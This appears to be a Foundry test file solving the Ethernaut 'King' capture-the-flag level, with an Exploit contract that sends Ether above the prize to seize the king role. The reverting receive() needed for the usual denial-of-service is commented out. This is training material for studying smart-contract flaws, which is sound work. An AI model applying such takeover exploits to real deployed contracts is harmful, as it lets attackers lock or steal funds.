// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/King.sol";
import "src/levels/KingFactory.sol";

contract TestKing is BaseTest {
    King private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new KingFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance{value : 0.001 ether}(true));
        level = King(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level._king(), address(levelFactory));
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player, player);
        Exploit expContract = new Exploit{value : level.prize() + 1}(payable(address(level)));
        console.log("expContract : %s", address(expContract));
        console.log("king : %s", level._king());
        vm.stopPrank();
    }
}

contract Exploit {
    bool public open = true;

    constructor(address payable to) public payable {
        (bool sent, bytes memory data) = to.call{value : msg.value}("");
        require(sent, "Failed to send Ether");
        open = false;
    }

//    receive() external payable {
//        require(open);
//    }
}